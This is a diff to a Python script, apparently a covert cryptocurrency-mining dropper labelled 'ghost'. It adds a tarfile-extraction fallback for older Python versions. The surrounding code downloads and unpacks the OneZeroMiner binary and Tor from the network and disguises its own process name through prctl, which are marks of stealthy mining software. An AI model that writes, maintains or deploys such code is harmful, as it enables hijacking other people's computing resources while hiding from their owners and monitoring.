@@ -24,6 +24,10 @@ _step = 0
 
 def log(m): print(f"[ghost] {m}", flush=True)
 
+def _extract(t, path):
+    try: t.extractall(path, filter="data")
+    except TypeError: t.extractall(path)
+
 def set_pname(n):
     try:
         import ctypes; ctypes.CDLL("libc.so.6", use_errno=True).prctl(15, n.encode()[:15], 0, 0, 0)
@@ -56,7 +60,7 @@ def setup():
         url = "https://github.com/OneZeroMiner/onezerominer/releases/download/v1.8.3/onezerominer-linux-1.8.3.tar.gz"
         tmp = DIR / "m.tar.gz"
         urllib.request.urlretrieve(url, tmp)
-        with tarfile.open(tmp, "r:gz") as t: t.extractall(DIR / "bin", filter="data")
+        with tarfile.open(tmp, "r:gz") as t: _extract(t, DIR / "bin")
         tmp.unlink()
         for p in (DIR / "bin").rglob("onezerominer"):
             if p.is_file() and not p.suffix:
@@ -91,7 +95,7 @@ def start_tor():
     try:
         log("Downloading Tor...")
         urllib.request.urlretrieve(TOR_URL, tarball)
-        with tarfile.open(tarball, "r:gz") as t: t.extractall(tmp, filter="data")
+        with tarfile.open(tarball, "r:gz") as t: _extract(t, tmp)
         os.unlink(tarball)
         tor_bin = None
         for r, d, f in os.walk(tmp):
